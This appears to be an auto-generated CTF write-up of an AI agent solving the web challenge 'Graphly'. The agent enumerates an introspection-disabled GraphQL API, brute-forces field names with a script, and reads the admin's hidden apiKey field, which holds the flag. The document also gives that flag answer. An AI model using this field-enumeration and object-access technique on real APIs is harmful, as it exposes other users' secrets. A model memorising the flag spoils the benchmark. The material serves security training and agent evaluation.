# Graphly [MEDIUM]

<!-- SCRIBE: replace this block with a 5-line 'what the trick was' intro. -->

- **Category**: WEB
- **Points**: 250
- **Solves**: 4
- **Flag**: `FLAG{gr4phql-b0l4-d1d-y0u-m34n}`
- **Winner**: `deepseek-flash`
- **Swarm cost**: $0.02 (winner $0.01)
- **Wall time**: 20m10s
- **Traces**: 2

## Adversarial description flags

- Flags: flag_claim
- Ground truth: Description flagged as adversarial. CTFd submit result and raw distfile bytes are authoritative. Description claims are hypotheses.

## Description

~~~
Graphly is a data-graph API with a query explorer. Explore the graph via the GraphQL
endpoint at /graphql.
**Flag format:** `FLAG{...}`
**Connection:** http://chal2.hackathon.ke:8018
~~~

## Trace

| Model | Status | Steps | Cost | Wall | Trace |
|---|---|---:|---:|---:|---|
| `deepseek-flash` | flag_found / CONFIRMED | 20 | $0.01 | 2m14s | `trace-Graphly_[MEDIUM]-deepseek-flash-20261029-123141.jsonl` |
| `deepseek-flash` | flag_found / CONFIRMED | 28 | $0.01 | 3m31s | `trace-Graphly_[MEDIUM]-deepseek-flash-20261029-124820.jsonl` |

_Window: 2026-10-29T12:31:44 to 2026-10-29T12:51:54_

## Solution path

### Step 1: `bash`
~~~
{
  "command": "ls -la /challenge/distfiles/; cat /tools.txt | head -50",
  "timeout_seconds": 60
}
~~~

~~~
CTF SANDBOX TOOLS REFERENCE
============================
All tools pre-installed in the sandbox. cat /tools.txt to view this file.

== NETWORKING ==
nc (netcat)        TCP/UDP connections. nc host port <<'EOF' for heredoc sessions.
curl               HTTP client. -s silent, -k skip TLS, -d data, -H header.
wget               HTTP download. wget -O file url.
nmap               Port scanner. nmap -sV host, nmap -p- host.
ffuf               Web fuzzer. ffuf -w wordlist -u http://host/FUZZ
gobuster           Directory/DNS/vhost brute force. gobuster dir -u http://host -w wordlist

== PASSWORD CRACKING ==
hashcat            GPU/CPU hash cracker. hashcat -m 0 -a 0 hashes.txt wordlist.txt
john               John the Ripper. john --wordlist=wordlist hashes.txt

== BINARY ANALYSIS ==
file               Identify file type. file binary
strings            Extract printable strings. strings -n 8 binary
xxd                Hex dump. xxd file | head, xxd -r to reverse.
hexdump            Hex dump. hexdump -C file.
binwalk            Firmware/embedded extraction. binwalk -e file to extract.
objdump            Disassembly. objdump -d binary (from binutils).
... [2000 chars total]
~~~

### Step 2: `bash`
~~~
{
  "command": "ls -la /challenge/ 2>/dev/null; curl -s -i http://chal2.hackathon.ke:8018/ | head -50",
  "timeout_seconds": 60
}
~~~

~~~
total 8
drwxr-xr-x 1 root root 4096 Oct 29 09:31 .
drwxr-xr-x 1 root root 4096 Oct 29 09:31 ..
-rwxrwxrwx 1 root root  518 Oct 29 07:52 metadata.yml
drwxrwxrwx 1 root root 4096 Oct 29 09:31 workspace
HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 29 Oct 2026 09:31:47 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 4961

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Graphly — API Explorer</title>
<style>
  :root{--bg:#fdf2f8;--panel:#fff;--ink:#3a0f29;--muted:#9a5d7f;--line:#f6d9ea;
        --brand:#db2777;--brand-ink:#be185d;--brand-soft:#fce7f3;--ok:#059669;--err:#b91c1c;
        --shadow:0 1px 2px rgba(16,24,40,.06),0 1px 3px rgba(16,24,40,.1);--radius:12px;}
  *{box-sizing:border-box}html,body{margin:0;height:100%}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--ink);font-size:14px;line-height:1.5}
  .brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px}
... [2000 chars total]
~~~

### Step 3: `bash`
~~~
{
  "command": "cat /challenge/metadata.yml; curl -s http://chal2.hackathon.ke:8018/ | sed -n '50,200p'",
  "timeout_seconds": 60
}
~~~

~~~
version: beta1
name: Graphly [MEDIUM]
category: WEB
description: 'Graphly is a data-graph API with a query explorer. Explore the graph
  via the GraphQL

  endpoint at /graphql.

  **Flag format:** `FLAG{...}`

  **Connection:** http://chal2.hackathon.ke:8018'
value: 250
solves: 4
adversarial:
  flag_claim: true
ground_truth: Description flagged as adversarial. CTFd submit result and raw distfile
  bytes are authoritative. Description claims are hypotheses.
sanitized: true
sanitizer_version: 1
    <div style="margin-top:12px"><button class="btn" id="go">Run query</button></div>
    <div class="out" id="out"></div>
    <div class="foot">Tip: the explorer reports helpful errors when a field name is wrong.</div>
  </div>
</div>
<script>
const $=s=>document.querySelector(s);
async function run(){
  const query=$('#q').value;
  const r=await fetch('/graphql',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({query})});
  const d=await r.json().catch(()=>({}));
  const o=$('#out'); o.style.display='block'; o.textContent=JSON.stringify(d,null,2);
}
$('#go').addEventListener('click',run);
... [1798 chars total]
~~~

### Step 4: `bash`
~~~
{
  "command": "cd /tmp; for q in '{__typename}' '{me}' '{users{id}}' '{ping}'; do echo \"== $q\"; curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"{\\\"query\\\":\\\"$q\\\"}\"; echo; done",
  "timeout_seconds": 60
}
~~~

~~~
== {__typename}
{"errors":[{"message":"introspection is disabled on this endpoint"}]}

== {me}
{"errors":[{"message":"Cannot query field 'me' on type 'Query'.\n\nGraphQL request:1:2\n1 | {me}\n  |  ^"}]}

== {users{id}}
{"data":{"users":[{"id":1},{"id":2},{"id":3}]}}

== {ping}
{"errors":[{"message":"Cannot query field 'ping' on type 'Query'.\n\nGraphQL request:1:2\n1 | {ping}\n  |  ^"}]}
~~~

### Step 5: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{users{id }}\"}'\nq '{\"query\":\"{users{__typename}}\"}'\nq '{\"query\":\"{users{id name}}\"}'\nq '{\"query\":\"{users{id email}}\"}'\nq '{\"query\":\"{users{id role}}\"}'\nq '{\"query\":\"{users{id password}}\"}'\nq '{\"query\":\"{users{id flag}}\"}'\nq '{\"query\":\"{users{id username}}\"}'\nq '{\"query\":\"{users{id admin}}\"}'\nq '{\"query\":\"{users{id secret}}\"}'\nq '{\"query\":\"{flag}\"}'\nq '{\"query\":\"{node(id:1){id}}\"}'\nq '{\"query\":\"{posts{id}}\"}'\nq '{\"query\":\"{users{id}{id}}\"}'\n",
  "timeout_seconds": 60
}
~~~

~~~
{"data":{"users":[{"id":1},{"id":2},{"id":3}]}}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}

{"data":{"users":[{"id":1,"name":"Root Admin"},{"id":2,"name":"Dana Okoye"},{"id":3,"name":"Milo Fenn"}]}}

{"data":{"users":[{"email":"root@graphly.io","id":1},{"email":"dana@graphly.io","id":2},{"email":"milo@graphly.io","id":3}]}}

{"data":{"users":[{"id":1,"role":"admin"},{"id":2,"role":"user"},{"id":3,"role":"user"}]}}

{"errors":[{"message":"Cannot query field 'password' on type 'User'.\n\nGraphQL request:1:11\n1 | {users{id password}}\n  |           ^"}]}

{"errors":[{"message":"Cannot query field 'flag' on type 'User'.\n\nGraphQL request:1:11\n1 | {users{id flag}}\n  |           ^"}]}

{"errors":[{"message":"Cannot query field 'username' on type 'User'. Did you mean 'name'?\n\nGraphQL request:1:11\n1 | {users{id username}}\n  |           ^"}]}

{"errors":[{"message":"Cannot query field 'admin' on type 'User'.\n\nGraphQL request:1:11\n1 | {users{id admin}}\n  |           ^"}]}

{"errors":[{"message":"Cannot query field 'secret' on type 'User'.\n\nGraphQL request:1:11\n1 | {users{id secret}}\n  |           ^"}]}

... [1641 chars total]
~~~

### Step 6: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nfor f in users user userById graph posts edges relationships friends messages notes flags secrets admin auditLogs logs tokens apiKeys settings config health version; do\necho \"$f: $(q \"{\\\"query\\\":\\\"{$f}\\\"}\")\"; done",
  "timeout_seconds": 60
}
~~~

~~~
users: {"errors":[{"message":"Field 'users' of type '[User]' must have a selection of subfields. Did you mean 'users { ... }'?\n\nGraphQL request:1:2\n1 | {users}\n  |  ^"}]}
user: {"errors":[{"message":"Field 'user' of type 'User' must have a selection of subfields. Did you mean 'user { ... }'?\n\nGraphQL request:1:2\n1 | {user}\n  |  ^"},{"message":"Field 'user' argument 'id' of type 'Int!' is required, but it was not provided.\n\nGraphQL request:1:2\n1 | {user}\n  |  ^"}]}
userById: {"errors":[{"message":"Cannot query field 'userById' on type 'Query'. Did you mean 'user' or 'users'?\n\nGraphQL request:1:2\n1 | {userById}\n  |  ^"}]}
graph: {"errors":[{"message":"Cannot query field 'graph' on type 'Query'.\n\nGraphQL request:1:2\n1 | {graph}\n  |  ^"}]}
posts: {"errors":[{"message":"Cannot query field 'posts' on type 'Query'.\n\nGraphQL request:1:2\n1 | {posts}\n  |  ^"}]}
edges: {"errors":[{"message":"Cannot query field 'edges' on type 'Query'.\n\nGraphQL request:1:2\n1 | {edges}\n  |  ^"}]}
relationships: {"errors":[{"message":"Cannot query field 'relationships' on type 'Query'.\n\nGraphQL request:1:2\n1 | {relationships}\n  |  ^"}]}
... [2000 chars total]
~~~

### Step 7: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{user(id:1){id name email role}}\"}'\nfor f in id name email role createdAt bio phone address private sensitive note notes data meta flag friends follows posts token password hash secret relation relations connections edges group groups friends_count; do\necho \"$f: $(q \"{\\\"query\\\":\\\"{user(id:1){$f}}\\\"}\" | head -c 300)\"; done",
  "timeout_seconds": 60
}
~~~

~~~
{"data":{"user":{"email":"root@graphly.io","id":1,"name":"Root Admin","role":"admin"}}}

id: {"data":{"user":{"id":1}}}
name: {"data":{"user":{"name":"Root Admin"}}}
email: {"data":{"user":{"email":"root@graphly.io"}}}
role: {"data":{"user":{"role":"admin"}}}
createdAt: {"errors":[{"message":"Cannot query field 'createdAt' on type 'User'.\n\nGraphQL request:1:13\n1 | {user(id:1){createdAt}}\n  |             ^"}]}
bio: {"errors":[{"message":"Cannot query field 'bio' on type 'User'. Did you mean 'id'?\n\nGraphQL request:1:13\n1 | {user(id:1){bio}}\n  |             ^"}]}
phone: {"errors":[{"message":"Cannot query field 'phone' on type 'User'. Did you mean 'role'?\n\nGraphQL request:1:13\n1 | {user(id:1){phone}}\n  |             ^"}]}
address: {"errors":[{"message":"Cannot query field 'address' on type 'User'.\n\nGraphQL request:1:13\n1 | {user(id:1){address}}\n  |             ^"}]}
private: {"errors":[{"message":"Cannot query field 'private' on type 'User'.\n\nGraphQL request:1:13\n1 | {user(id:1){private}}\n  |             ^"}]}
sensitive: {"errors":[{"message":"Cannot query field 'sensitive' on type 'User'.\n\nGraphQL request:1:13\n1 | {user(id:1){sensitive}}\n  |             ^"}]}
... [2000 chars total]
~~~

### Step 8: `bash`
~~~
{
  "command": "cd /tmp; for p in graphql graphql/ graphiql .graphql schema sdl api api/graphql admin devices oauth auth login register robots.txt .env backup metrics; do echo \"== $p $(curl -s -o /dev/null -w '%{http_code} %{size_download}' http://chal2.hackathon.ke:8018/$p)\"; done",
  "timeout_seconds": 60
}
~~~

~~~
== graphql 405 153
== graphql/ 404 207
== graphiql 404 207
== .graphql 404 207
== schema 404 207
== sdl 404 207
== api 404 207
== api/graphql 404 207
== admin 404 207
== devices 404 207
== oauth 404 207
== auth 404 207
== login 404 207
== register 404 207
== robots.txt 404 207
== .env 404 207
== backup 404 207
== metrics 404 207
~~~

### Step 9: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{user(id:1){id} }\"}'\nq '{\"query\":\"{user(id:1){name email __typename}}\"}'\nq '{\"query\":\"{user(id:0){id}}\"}'\nq '{\"query\":\"{user(id:4){id}}\"}'\nq '{\"query\":\"{users(filter:{role:\\\"admin\\\"}){id}}\"}'\nq '{\"query\":\"{users(role:\\\"admin\\\"){id}}\"}'\nq '{\"query\":\"{users(first:1){id}}\"}'\nq '{\"query\":\"{users(limit:1){id}}\"}'\nq '{\"query\":\"{user(id:1){id} user(id:1){email}}\"}'\n",
  "timeout_seconds": 60
}
~~~

~~~
{"data":{"user":{"id":1}}}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}

{"data":{"user":null}}

{"data":{"user":null}}

{"errors":[{"message":"Unknown argument 'filter' on field 'Query.users'.\n\nGraphQL request:1:8\n1 | {users(filter:{role:\"admin\"}){id}}\n  |        ^"}]}

{"errors":[{"message":"Unknown argument 'role' on field 'Query.users'.\n\nGraphQL request:1:8\n1 | {users(role:\"admin\"){id}}\n  |        ^"}]}

{"errors":[{"message":"Unknown argument 'first' on field 'Query.users'.\n\nGraphQL request:1:8\n1 | {users(first:1){id}}\n  |        ^"}]}

{"errors":[{"message":"Unknown argument 'limit' on field 'Query.users'.\n\nGraphQL request:1:8\n1 | {users(limit:1){id}}\n  |        ^"}]}

{"data":{"user":{"email":"root@graphly.io","id":1}}}
~~~

### Step 10: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{user(id:1){id}}\"}'\nq '{\"query\":\"{user(id:1){name}}\"}'\nq '{\"query\":\"{user(id:1){email}}\"}'\nq '{\"query\":\"{user(id:1){role}}\"}'\nq '{\"query\":\"{user(id:1){name email}}\"}'\nq '{\"query\":\"{user(id:1){id name}}\"}'\nq '{\"query\":\"{user(id:1){id email}}\"}'\nq '{\"query\":\"{user(id:1){id role}}\"}'\n",
  "timeout_seconds": 60
}
~~~

~~~
{"data":{"user":{"id":1}}}

{"data":{"user":{"name":"Root Admin"}}}

{"data":{"user":{"email":"root@graphly.io"}}}

{"data":{"user":{"role":"admin"}}}

{"data":{"user":{"email":"root@graphly.io","name":"Root Admin"}}}

{"data":{"user":{"id":1,"name":"Root Admin"}}}

{"data":{"user":{"email":"root@graphly.io","id":1}}}

{"data":{"user":{"id":1,"role":"admin"}}}
~~~

### Step 11: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{user(id:1){id name email role}}\"}'\nq '{\"query\":\"{user(id:1){id name email}}\"}'\nq '{\"query\":\"{user(id:1){name email role}}\"}'\nq '{\"query\":\"{users{id name email role}}\"}'\nq '{\"query\":\"{users{__typename}}\"}'\nq '{\"query\":\"{user(id:1){__typename}}\"}'\nq '{\"query\":\"{user(id:1){name __typename}}\"}'\n",
  "timeout_seconds": 60
}
~~~

~~~
{"data":{"user":{"email":"root@graphly.io","id":1,"name":"Root Admin","role":"admin"}}}

{"data":{"user":{"email":"root@graphly.io","id":1,"name":"Root Admin"}}}

{"data":{"user":{"email":"root@graphly.io","name":"Root Admin","role":"admin"}}}

{"data":{"users":[{"email":"root@graphly.io","id":1,"name":"Root Admin","role":"admin"},{"email":"dana@graphly.io","id":2,"name":"Dana Okoye","role":"user"},{"email":"milo@graphly.io","id":3,"name":"Milo Fenn","role":"user"}]}}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}
~~~

### Step 12: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{admin{flag}}\"}'\nq '{\"query\":\"{admin}\"}'\nq '{\"query\":\"{admin{id}}\"}'\nq '{\"query\":\"{me{id}}\"}'\nq '{\"query\":\"mutation{login(username:\\\"root\\\",password:\\\"x\\\"){token}}\"}'\nq '{\"query\":\"{__schema{types{name}}}\"}'\nq '{\"query\":\"{__type(name:\\\"User\\\"){fields{name}}}\"}'\n",
  "timeout_seconds": 60
}
~~~

~~~
{"errors":[{"message":"Cannot query field 'admin' on type 'Query'.\n\nGraphQL request:1:2\n1 | {admin{flag}}\n  |  ^"}]}

{"errors":[{"message":"Cannot query field 'admin' on type 'Query'.\n\nGraphQL request:1:2\n1 | {admin}\n  |  ^"}]}

{"errors":[{"message":"Cannot query field 'admin' on type 'Query'.\n\nGraphQL request:1:2\n1 | {admin{id}}\n  |  ^"}]}

{"errors":[{"message":"Cannot query field 'me' on type 'Query'.\n\nGraphQL request:1:2\n1 | {me{id}}\n  |  ^"}]}

{"errors":[{"message":"Schema is not configured to execute mutation operation.\n\nGraphQL request:1:1\n1 | mutation{login(username:\"root\",password:\"x\"){token}}\n  | ^"}]}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}
~~~

### Step 13: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{user(id:1){id{}}}\"}'\nq '{\"query\":\"{xyz}\"}'\nq '{\"query\":\"{user(id:1){xyz}}\"}'\nq '{\"query\":\"{user(id:1){id xyz}}\"}'\nq '{\"query\":\"{xyz user(id:1){id}}\"}'\n",
  "timeout_seconds": 60
}
~~~

~~~
{"errors":[{"message":"Syntax Error: Expected Name, found '}'.\n\nGraphQL request:1:16\n1 | {user(id:1){id{}}}\n  |                ^"}]}

{"errors":[{"message":"Cannot query field 'xyz' on type 'Query'.\n\nGraphQL request:1:2\n1 | {xyz}\n  |  ^"}]}

{"errors":[{"message":"Cannot query field 'xyz' on type 'User'.\n\nGraphQL request:1:13\n1 | {user(id:1){xyz}}\n  |             ^"}]}

{"errors":[{"message":"Cannot query field 'xyz' on type 'User'.\n\nGraphQL request:1:16\n1 | {user(id:1){id xyz}}\n  |                ^"}]}

{"errors":[{"message":"Cannot query field 'xyz' on type 'Query'.\n\nGraphQL request:1:2\n1 | {xyz user(id:1){id}}\n  |  ^"}]}
~~~

### Step 14: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{user(id:1){id} \"}'\nq '{\"query\":\"{user(id:1){id} }\"}'\nq '{\"query\":\"{user(id:1){id, name}}\"}'\nq '{\"query\":\"{ user(id:1){id} }\"}'\nq '{\"query\":\"query{user(id:1){id}}\"}'\nq '{\"query\":\"query Q{user(id:1){id}}\"}'\nq '{\"query\":\"{user(id:1){id name email role }\"}'\nq '{\"query\":\"{user(id:1){id name email role}}\"}'\nq '{\"query\":\"{user(id:1){id name email role}} \"}'\nq '{\"query\":\"{user(id:1){id name email role}}\\n\"}'\n",
  "timeout_seconds": 60
}
~~~

~~~
{"errors":[{"message":"Syntax Error: Expected Name, found <EOF>.\n\nGraphQL request:1:17\n1 | {user(id:1){id} \n  |                 ^"}]}

{"data":{"user":{"id":1}}}

{"data":{"user":{"id":1,"name":"Root Admin"}}}

{"data":{"user":{"id":1}}}

{"data":{"user":{"id":1}}}

{"data":{"user":{"id":1}}}

{"errors":[{"message":"Syntax Error: Expected Name, found <EOF>.\n\nGraphQL request:1:33\n1 | {user(id:1){id name email role }\n  |                                 ^"}]}

{"data":{"user":{"email":"root@graphly.io","id":1,"name":"Root Admin","role":"admin"}}}

{"data":{"user":{"email":"root@graphly.io","id":1,"name":"Root Admin","role":"admin"}}}

{"data":{"user":{"email":"root@graphly.io","id":1,"name":"Root Admin","role":"admin"}}}
~~~

### Step 15: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{a:user(id:1){id} b:user(id:2){email}}\"}'\nq '{\"query\":\"{users @skip(if:true){id}}\"}'\nq '{\"query\":\"{users @include(if:true){id}}\"}'\nq '{\"query\":\"{user(id:1){id}}\", \"operationName\":\"x\"}'\nq '{\"query\":\"query($id:Int!){user(id:$id){id}}\",\"variables\":{\"id\":2}}'\nq '{\"query\":\"{user(id:\\\"1\\\"){id}}\"}'\nq '{\"query\":\"{user(id:1.5){id}}\"}'\nq '{\"query\":\"{user(id:1e2){id}}\"}'\nq '{\"query\":\"{user(id:-1){id}}\"}'\n",
  "timeout_seconds": 60
}
~~~

~~~
{"data":{"a":{"id":1},"b":{"email":"dana@graphly.io"}}}

{"data":{}}

{"data":{"users":[{"id":1},{"id":2},{"id":3}]}}

{"data":{"user":{"id":1}}}

{"data":{"user":{"id":2}}}

{"errors":[{"message":"Int cannot represent non-integer value: \"1\"\n\nGraphQL request:1:10\n1 | {user(id:\"1\"){id}}\n  |          ^"}]}

{"errors":[{"message":"Int cannot represent non-integer value: 1.5\n\nGraphQL request:1:10\n1 | {user(id:1.5){id}}\n  |          ^"}]}

{"errors":[{"message":"Int cannot represent non-integer value: 1e2\n\nGraphQL request:1:10\n1 | {user(id:1e2){id}}\n  |          ^"}]}

{"data":{"user":null}}
~~~

### Step 16: `bash`
~~~
{
  "command": "cd /tmp; q(){ curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d \"$1\"; echo; }; \nq '{\"query\":\"{u:user(id:1){n:name e:email}}\"}'\nq '{\"query\":\"{user(id:1){name(email:\\\"1\\\")}}\"}'\nq '{\"query\":\"{user(id:1,name:\\\"x\\\"){id}}\"}'\nq '{\"query\":\"{users(id:1){id}}\"}'\nq '{\"query\":\"{user{id}}\"}'\nq '{\"query\":\"{user(id:1){id} user(id:2){name}}\"}'\nq '{\"query\":\"{__typename}\"}'\nq '{\"query\":\"{user(id:1){__typename}}\"}'\nq '{\"query\":\"{__schema}\"}'\nq '{\"query\":\"{__schema{queryType{name}}}\"}'\n",
  "timeout_seconds": 60
}
~~~

~~~
{"data":{"u":{"e":"root@graphly.io","n":"Root Admin"}}}

{"errors":[{"message":"Unknown argument 'email' on field 'User.name'.\n\nGraphQL request:1:18\n1 | {user(id:1){name(email:\"1\")}}\n  |                  ^"}]}

{"errors":[{"message":"Unknown argument 'name' on field 'Query.user'.\n\nGraphQL request:1:12\n1 | {user(id:1,name:\"x\"){id}}\n  |            ^"}]}

{"errors":[{"message":"Unknown argument 'id' on field 'Query.users'.\n\nGraphQL request:1:8\n1 | {users(id:1){id}}\n  |        ^"}]}

{"errors":[{"message":"Field 'user' argument 'id' of type 'Int!' is required, but it was not provided.\n\nGraphQL request:1:2\n1 | {user{id}}\n  |  ^"}]}

{"errors":[{"message":"Fields 'user' conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.\n\nGraphQL request:1:2\n1 | {user(id:1){id} user(id:2){name}}\n  |  ^\n\nGraphQL request:1:17\n1 | {user(id:1){id} user(id:2){name}}\n  |                 ^"}]}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}

{"errors":[{"message":"introspection is disabled on this endpoint"}]}

... [1259 chars total]
~~~

### Step 17: `bash`
~~~
{
  "command": "mkdir -p /challenge/workspace; cat > /challenge/workspace/probe.py <<'EOF'\nimport requests, json, sys\nURL=\"http://chal2.hackathon.ke:8018/graphql\"\ndef q(query):\n    try:\n        r=requests.post(URL,json={\"query\":query},timeout=10)\n        return r.json()\n    except Exception as e:\n        return {\"exc\":str(e)}\ndef body(qq):\n    m=q(qq)\n    if \"errors\" in m:\n        return \"ERR:\"+m[\"errors\"][0][\"message\"].split(\"\\n\")[0]\n    return \"OK:\"+json.dumps(m[\"data\"])\n# step 1 parent type of users\nprint(\"users:\", q(\"{users}\"))\nprint(\"user:\", q(\"{user}\"))\nEOF\npython3 /challenge/workspace/probe.py",
  "timeout_seconds": 60
}
~~~

~~~
users: {'errors': [{'message': "Field 'users' of type '[User]' must have a selection of subfields. Did you mean 'users { ... }'?\n\nGraphQL request:1:2\n1 | {users}\n  |  ^"}]}
user: {'errors': [{'message': "Field 'user' of type 'User' must have a selection of subfields. Did you mean 'user { ... }'?\n\nGraphQL request:1:2\n1 | {user}\n  |  ^"}, {'message': "Field 'user' argument 'id' of type 'Int!' is required, but it was not provided.\n\nGraphQL request:1:2\n1 | {user}\n  |  ^"}]}
~~~

### Step 18: `bash`
~~~
{"command": "cat > /challenge/workspace/brute.py <<'PY'\nimport requests, json\nfrom concurrent.futures import ThreadPoolExecutor\nURL=\"http://chal2.hackathon.ke:8018/graphql\"\nS=requests.Session()\nnames=[l.strip() for l in open('/challenge/workspace/cands.txt') if l.strip()]\ndef test(ptype):\n    def f(n):\n        q=\"{user(id:1){%s}}\"%n if ptype==\"User\" else \"{%s}\"%n\n        try:\n            r=S.post(URL,json={\"query\":q},timeout=10).json()\n        except Exception as e: return (n,\"EXC\",str(e))\n        if \"errors\" in r:\n            return None\n        # Present: need subfields maybe\n        # also if error is \"must have selection of subfields\" -> present object type\n        return (n, json.dumps(r.get(\"data\")))\n    with ThreadPoolExecutor(20) as ex:\n        for res in ex.map(f,names):\n            if res:\n                n,d=res\n                if not d.s
... [2000 chars total]
~~~

~~~
419
===== User
User PRESENT ('apiKey', '{"user": {"apiKey": "FLAG{gr4phql-b0l4-d1d-y0u-m34n}"}}')

[stderr]
Traceback (most recent call last):
  File "/challenge/workspace/brute.py", line 38, in <module>
    test(t)
  File "/challenge/workspace/brute.py", line 20, in test
    n,d=res
ValueError: too many values to unpack (expected 2)

[exit 1]
~~~

### Step 19: `bash`
~~~
{
  "command": "curl -s -X POST http://chal2.hackathon.ke:8018/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{user(id:1){apiKey}}\"}'",
  "timeout_seconds": 60
}
~~~

~~~
{"data":{"user":{"apiKey":"FLAG{gr4phql-b0l4-d1d-y0u-m34n}"}}}
~~~

### Step 20: `submit_flag`
~~~
{
  "flag": "FLAG{gr4phql-b0l4-d1d-y0u-m34n}"
}
~~~

~~~
DRY RUN — would submit "FLAG{gr4phql-b0l4-d1d-y0u-m34n}" but --no-submit is set.
~~~

## Result

- **Flag**: `FLAG{gr4phql-b0l4-d1d-y0u-m34n}`
- **Confirmed by CTFd**: yes
- **Cost**: $0.01 (winner), $0.02 (whole swarm)
- **Wall time**: 20m10s
- **Generated**: 2026-10-30T00:14:55
